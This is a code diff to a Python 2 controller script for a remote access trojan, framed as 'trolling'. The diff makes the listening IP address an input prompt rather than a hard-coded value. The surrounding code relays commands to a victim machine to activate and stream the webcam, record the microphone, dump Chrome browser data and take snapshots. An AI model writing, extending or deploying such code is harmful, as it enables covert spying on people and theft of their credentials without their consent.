@@ -1,7 +1,5 @@
 import socket, os, time
 import cv2, numpy
- 
-ip_address = '192.168.10.16'
 
 banner ="""                                                  
    (                    *   )               (    (   
@@ -46,11 +44,11 @@ def functions():
 1: OK and Cancel                        32: Warning query icon
 2: Abort, Retry, Ignore                 48: Warning message icon 
 3: Yes, No, Cancel                      64: Information message icon
-4: Yes and No	                        4096: Always on top of the desktop
+4: Yes and No                           4096: Always on top of the desktop
 5: Retry and Cancel
     """
                                                  
-def webCam(connection, command):
+def webCam(connection, command, ip_address):
     connection.send(command)
     while True:
         soc = socket.socket()
@@ -146,7 +144,7 @@ def snapshot(conn,command):
             break
         f.write(bits)
 
-def connect():
+def connect(ip_address):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((ip_address, 8080))
     s.listen(1)
@@ -171,7 +169,7 @@ def connect():
         elif 'getWebcam' in command:
              transfer(conn, command)
         elif 'activateWebcam' in command:
-            webCam(conn, command)
+            webCam(conn, command, ip_address)
         elif 'getRecording' in command:
              recordMic(conn, command)
         elif 'chromeDump' in command:
@@ -204,13 +202,14 @@ def main ():
         if cmd == 'CoN-mE':
             functions()
         elif cmd == 'start-trolling':
-            if connect() == 1:
+            ip_address = raw_input('> IP Address: ')
+            if connect(ip_address) == 1:
                 os.system('cls')
                 print banner
                 print 'Hope You Had Fun!'
                 break
         else:
             main()
-
-if __name__ == "__main__":
+            
+if __name__ == '__main__':
     main()
